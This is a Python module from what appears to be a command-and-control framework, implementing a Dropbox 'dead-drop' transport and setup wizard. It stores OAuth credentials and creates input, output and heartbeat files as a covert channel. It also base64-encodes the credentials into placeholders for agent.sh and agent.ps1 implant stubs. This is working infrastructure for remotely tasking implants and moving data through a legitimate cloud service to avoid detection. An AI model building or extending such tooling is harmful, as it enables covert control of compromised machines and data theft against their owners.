"""
Dropbox provider — transport + deployment wizard.

Importing this module registers DropboxTransport in TRANSPORT_REGISTRY so the
SessionManager can instantiate it when loading saved session profiles.

DropboxWizard only contains Dropbox-specific logic; all provider-agnostic steps
(keygen, deploy_dir, stub generation, docs, summary) are inherited from ProviderWizard.
"""
import base64
import json
import re
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests

from providers import _p, ask, err, info, ok, warn
from providers.base import (
    BaseConfig, BaseTransport, ProviderWizard, RateLimitedError, TRANSPORT_REGISTRY,
)

_HERE         = Path(__file__).parent
_OLD_CREDS    = _HERE.parent.parent / ".dropbox_refresh_token"
CREDS_FILE    = Path("credentials") / "dropbox"

_TOKEN_URL    = "https://api.dropboxapi.com/oauth2/token"
_UPLOAD_URL   = "https://content.dropboxapi.com/2/files/upload"
_DOWNLOAD_URL = "https://content.dropboxapi.com/2/files/download"
_DELETE_URL   = "https://api.dropboxapi.com/2/files/delete_v2"


# ╔══════════════════════════════════════════════════════════════════════════════
# ║  DROPBOX TRANSPORT  (runtime channel for an active session)
# ╚══════════════════════════════════════════════════════════════════════════════

class DropboxTransport(BaseTransport):
    """Dead-drop transport over Dropbox API v2."""

    def __init__(self, creds: dict):
        self._app_key       = creds.get("APP_KEY", "")
        self._app_secret    = creds.get("APP_SECRET", "")
        self._refresh_token = creds.get("REFRESH_TOKEN", "")
        self._token:        str   = ""
        self._token_expiry: float = 0.0

    def _access_token(self) -> str:
        import time
        if self._token and time.time() < self._token_expiry - 60:
            return self._token
        try:
            r = requests.post(_TOKEN_URL, data={
                "grant_type":    "refresh_token",
                "refresh_token": self._refresh_token,
                "client_id":     self._app_key,
                "client_secret": self._app_secret,
            }, timeout=15)
            d = r.json()
            self._token         = d.get("access_token", "")
            expires_in          = int(d.get("expires_in", 14400))
            self._token_expiry  = time.time() + expires_in
            return self._token
        except Exception:
            return ""

    def upload(self, path: str, data: bytes) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.post(
                _UPLOAD_URL,
                headers={
                    "Authorization":   f"Bearer {token}",
                    "Dropbox-API-Arg": json.dumps({
                        "path": path, "mode": "overwrite", "autorename": False,
                    }),
                    "Content-Type":    "application/octet-stream",
                },
                data=data,
                timeout=30,
            )
            return r.status_code == 200
        except Exception:
            return False

    def download(self, path: str) -> Optional[bytes]:
        token = self._access_token()
        if not token:
            return None
        try:
            r = requests.post(
                _DOWNLOAD_URL,
                headers={
                    "Authorization":   f"Bearer {token}",
                    "Dropbox-API-Arg": json.dumps({"path": path}),
                },
                timeout=30,
            )
            if r.status_code == 429:
                raise RateLimitedError("Dropbox rate limited")
            if r.status_code == 200:
                return r.content
            return None
        except RateLimitedError:
            raise
        except Exception:
            return None

    def delete(self, path: str) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.post(
                _DELETE_URL,
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type":  "application/json",
                },
                json={"path": path},
                timeout=30,
            )
            return r.status_code == 200
        except Exception:
            return False


# Register so SessionManager can reconstruct transport from saved profiles.
TRANSPORT_REGISTRY["dropbox"] = DropboxTransport


# ============================================================
# DROPBOX CONFIG
# ============================================================

@dataclass
class DropboxConfig(BaseConfig):
    """BaseConfig + Dropbox OAuth2 credentials."""
    app_key:       str = ""
    app_secret:    str = ""
    refresh_token: str = ""

    def save_creds(self) -> None:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        CREDS_FILE.write_text(
            "# Dropbox OAuth2 Configuration\n"
            f"# Generated: {datetime.now().strftime('%a %b %d %I:%M:%S %p %Z %Y')}\n\n"
            f'APP_KEY="{self.app_key}"\n'
            f'APP_SECRET="{self.app_secret}"\n'
            f'REFRESH_TOKEN="{self.refresh_token}"\n'
        )
        CREDS_FILE.chmod(0o600)

    def load_creds(self) -> bool:
        if not CREDS_FILE.exists():
            if _OLD_CREDS.exists():
                CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
                _OLD_CREDS.rename(CREDS_FILE)
            else:
                return False
        for line in CREDS_FILE.read_text().splitlines():
            m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
            if m:
                k, v = m.group(1), m.group(2).strip()
                if k == "APP_KEY":       self.app_key       = v
                if k == "APP_SECRET":    self.app_secret    = v
                if k == "REFRESH_TOKEN": self.refresh_token = v
        return bool(self.app_key and self.app_secret and self.refresh_token)


# ============================================================
# DROPBOX WIZARD
# ============================================================

class DropboxWizard(ProviderWizard):
    PROVIDER_ID   = "dropbox"
    PROVIDER_NAME = "Dropbox"
    PROVIDER_ICON = "📡"
    TRANSPORT_DIR = _HERE / "transport"

    def _creds_path(self, deploy_dir: Path) -> Path:
        return deploy_dir / f".{self.PROVIDER_ID}_creds"

    # ── abstract hook implementations ────────────────────────────────────────

    def make_config(self) -> DropboxConfig:
        return DropboxConfig()

    def step_auth(self, cfg: DropboxConfig) -> None:
        self._step("Dropbox OAuth2 Configuration")

        _found = CREDS_FILE if CREDS_FILE.exists() else (_OLD_CREDS if _OLD_CREDS.exists() else None)
        if _found:
            _ans = ask(f"Found existing credentials ({_found}). Reuse? [Y/n]")
            if not _ans or _ans.lower().startswith("y"):
                if cfg.load_creds():
                    ok(f"OAuth2 credentials loaded from {CREDS_FILE}")
                    return
                warn("Saved credentials incomplete — re-entering")

        _p([("", "")])
        _p([("class:yellow", "  New app — create one:")])
        info("— https://www.dropbox.com/developers/apps/create")
        info("— Scoped access → Full Dropbox")
        info("— Permissions → files.content.read + files.content.write")
        _p([("", "")])
        _p([("class:yellow", "  Existing app — find credentials:")])
        info("— https://www.dropbox.com/developers/apps → select your app")
        info("— Settings tab → App key / App secret")
        _p([("", "")])

        cfg.app_key    = ask("APP_KEY")
        cfg.app_secret = ask("APP_SECRET")
        if not cfg.app_key or not cfg.app_secret:
            err("APP_KEY and APP_SECRET are required")

        auth_url = (
            "https://www.dropbox.com/oauth2/authorize"
            "?response_type=code&client_id=" + cfg.app_key + "&token_access_type=offline"
        )
        _p([("", "")])
        _p([("class:yellow", "  Open this URL in your browser:")])
        _p([("class:green",  "\n  " + auth_url + "\n")])
        auth_code = ask("AUTHORIZATION CODE")
        if not auth_code:
            err("Authorization code is required")

        info("Requesting refresh token...")
        try:
            r    = requests.post(_TOKEN_URL, data={
                "code": auth_code, "grant_type": "authorization_code",
                "client_id": cfg.app_key, "client_secret": cfg.app_secret,
            }, timeout=15)
            data = r.json()
        except Exception as e:
            err(f"Token request failed: {e}")

        cfg.refresh_token = data.get("refresh_token", "")
        if not cfg.refresh_token:
            info("Response: " + str(data))
            err("Could not obtain refresh token")

        ok(f"Refresh token obtained ({len(cfg.refresh_token)} chars)")
        cfg.save_creds()
        ok("Credentials saved (reusable for future deployments)")

    def step_init_channel(self, cfg: DropboxConfig) -> None:
        self._step("Dropbox File Initialization")
        t = self._make_transport(cfg)
        for dest, body in [
            (cfg.folder_path + cfg.input_file,     b"MZ"),
            (cfg.folder_path + cfg.output_file,    b"MZ"),
            (cfg.folder_path + cfg.heartbeat_file, b"MZ"),
        ]:
            if t.upload(dest, body):
                ok(f"{dest} -> initialized")
            else:
                warn(f"{dest} — upload failed; create manually on Dropbox if needed")

    def _provider_subs(self, cfg: DropboxConfig) -> dict:
        return {
            # agent.sh / agent.ps1 placeholders
            "PLACEHOLDER_APP_KEY_B64":       base64.b64encode(cfg.app_key.encode()).decode(),
            "PLACEHOLDER_APP_SECRET_B64":    base64.b64encode(cfg.app_secret.encode()).decode(),
            "PLACEHOLDER_REFRESH_TOKEN_B64": base64.b64encode(cfg.refresh_token.encode()).decode(),
            # stub placeholders (STUB_* prefix, same credential values)
            "STUB_APP_KEY_B64":              base64.b64encode(cfg.app_key.encode()).decode(),
            "STUB_APP_SECRET_B64":           base64.b64encode(cfg.app_secret.encode()).decode(),
            "STUB_REFRESH_TOKEN_B64":        base64.b64encode(cfg.refresh_token.encode()).decode(),
        }

    def _native_agent_extra_env(self, cfg: DropboxConfig) -> dict:
        return {
            "STRATUM_APP_KEY":       cfg.app_key,
            "STRATUM_APP_SECRET":    cfg.app_secret,
            "STRATUM_REFRESH_TOKEN": cfg.refresh_token,
            "STRATUM_PROVIDER":      "dropbox",
        }

    def _make_transport(self, cfg: DropboxConfig) -> DropboxTransport:
        return DropboxTransport({
            "APP_KEY":       cfg.app_key,
            "APP_SECRET":    cfg.app_secret,
            "REFRESH_TOKEN": cfg.refresh_token,
        })

